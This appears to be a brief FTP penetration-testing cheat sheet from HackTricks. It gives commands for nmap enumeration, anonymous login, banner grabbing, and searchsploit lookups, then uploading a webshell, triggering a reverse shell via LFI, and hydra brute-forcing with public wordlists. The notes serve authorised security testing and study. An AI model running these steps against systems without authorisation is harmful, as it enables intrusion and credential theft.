https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp

### Initial checks

Nmap enumeration:
```bash
nmap --script ftp* -p21 <ip>
```

Check for anonymous login:
```bash
ftp anonymous@<IP>
```
--> OR `ftp:ftp`
--> Get files recursively: `wget -r ftp://<USER>:<PASS>@<IP>/`

Banner grabbing:
```bash
nc -vn <IP> 21
```

Check for vulnerabilities:
```bash
searchsploit ftp
```


### Exploitation

Upload binary or webshell:
```bash
ftp> binary
ftp> put <file>
```
--> Execute reverse shell in browser?
--> LFI? Check config file for document root: `/etc/vsftpd.conf` -> Execute revshell

Bruteforce FTP:
```bash
hydra -L users -P passwords ftp://<IP> -s 21
```
--> [FTP list](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt)
--> Rockyou (passwords)
--> [Usernames](https://github.com/danielmiessler/SecLists/tree/master/Usernames)
